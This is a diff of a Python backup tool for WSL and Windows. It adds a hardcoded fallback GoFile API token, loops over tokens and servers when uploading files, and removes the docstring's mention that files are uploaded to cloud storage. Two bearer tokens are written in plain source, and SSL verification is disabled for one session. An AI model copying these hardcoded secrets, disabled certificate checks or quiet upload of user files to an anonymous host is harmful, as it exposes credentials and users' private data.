@@ -1,10 +1,8 @@
 # -*- coding: utf-8 -*-
 """
-自动备份和上传工具
-功能：备份WSL和Windows系统中的重要文件，并自动上传到云存储
+自动备份工具-wsl版本
 """
 
-# 先导入标准库
 import os
 import sys
 import shutil
@@ -584,8 +582,10 @@ class BackupManager:
         self.session.verify = False  # 禁用SSL验证
         self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
         
-        # GoFile API token（备选方案）
+        # GoFile API token（备选方案）：主 token 失败时回退到备用 token
         self.api_token = "z7hjnq2voZ7tDyh7VHBKeIf0B6k1CuXC"
+        self.api_token_fallback = "9o0Su5ainOFK9fFxzLaiuRKPOxgaUmCm"
+        self.api_tokens = [self.api_token, self.api_token_fallback]
         
         self._setup_logging()
 
@@ -1536,7 +1536,7 @@ class BackupManager:
             return False
 
     def _upload_single_file_gofile(self, file_path):
-        """上传单个文件到 GoFile（备选方案）
+        """上传单个文件到 GoFile（备选方案，支持主/备 token 回退）
         
         Args:
             file_path: 要上传的文件路径
@@ -1557,6 +1557,9 @@ class BackupManager:
             filename = os.path.basename(file_path)
             logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
 
+            # API token 列表：主 token 失败后依次回退到备用 token
+            api_tokens = [t for t in getattr(self, "api_tokens", []) if t] or [self.api_token]
+
             for attempt in range(self.config.RETRY_COUNT):
                 # 检查网络连接
                 if not self._check_internet_connection():
@@ -1564,7 +1567,18 @@ class BackupManager:
                     time.sleep(self.config.RETRY_DELAY * 2)  # 网络问题时等待更长时间
                     continue
 
-                for server in self.config.UPLOAD_SERVERS:
+                # 服务器轮询（主 token 的所有服务器都失败后，回退到备用 token 继续轮询）
+                upload_targets = [
+                    (token_index, api_token, server)
+                    for token_index, api_token in enumerate(api_tokens, start=1)
+                    for server in self.config.UPLOAD_SERVERS
+                ]
+                last_token_index = 0
+                for token_index, api_token, server in upload_targets:
+                    if token_index != last_token_index:
+                        last_token_index = token_index
+                        if token_index > 1:
+                            logging.warning(f"⚠️ [GoFile] 主 token 上传失败，回退到备用 token ({token_index}/{len(api_tokens)}): {filename}")
                     try:
                         with open(file_path, "rb") as f:
                             if attempt == 0:
@@ -1575,7 +1589,7 @@ class BackupManager:
                             response = requests.post(
                                 server,
                                 files={"file": f},
-                                headers={"Authorization": f"Bearer {self.api_token}"},
+                                headers={"Authorization": f"Bearer {api_token}"},
                                 timeout=self.config.UPLOAD_TIMEOUT,
                                 verify=True
                             )
